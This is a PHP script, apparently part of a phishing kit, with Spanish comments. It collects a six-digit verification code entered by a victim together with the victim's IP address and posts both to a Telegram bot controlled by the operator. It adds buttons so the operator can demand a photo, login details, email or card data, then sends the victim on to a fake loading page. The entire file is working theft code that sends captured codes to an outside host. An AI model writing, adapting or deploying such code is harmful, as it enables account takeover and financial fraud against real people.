<?php
session_start();
include 'data.php';

// Obtener los dígitos del formulario
$digit1 = $_POST['digit1'];
$digit2 = $_POST['digit2'];
$digit3 = $_POST['digit3'];
$digit4 = $_POST['digit4'];
$digit5 = $_POST['digit5'];
$digit6 = $_POST['digit6'];

// Obtener la dirección IP del cliente
$clientIP = $_SERVER['REMOTE_ADDR'];

// Get session ID from existing session
$sessionId = $_SESSION['user_session_id'] ?? null;

// Construir el mensaje a enviar al bot de Telegram
$message = "Codigo 2: $digit1$digit2$digit3$digit4$digit5$digit6\n";
$message .= "IP: $clientIP";

// URL de la API de Telegram para enviar mensajes
$telegramAPI = "https://api.telegram.org/bot$botToken/sendMessage";

// Enviar con botones si hay sesión
if ($sessionId) {
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '� Pedir Foto', 'callback_data' => 'photo_' . $sessionId],
                ['text' => '🔁 Login', 'callback_data' => 'login_' . $sessionId]
            ],
            [
                ['text' => '�📩 Mail', 'callback_data' => 'mail_' . $sessionId],
                ['text' => '💳 Tarjeta', 'callback_data' => 'tarjeta_' . $sessionId]
            ],
            [
                ['text' => '✅ Listo', 'callback_data' => 'listo_' . $sessionId]
            ]
        ]
    ];
    
    $postData = [
        'chat_id' => $chatID,
        'text' => $message,
        'reply_markup' => json_encode($keyboard)
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramAPI);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
} else {
    // Fallback sin botón
    $params = [
        'chat_id' => $chatID,
        'text' => $message,
    ];
    file_get_contents("$telegramAPI?" . http_build_query($params));
}

header('Location: carga2.html');
exit;

?>
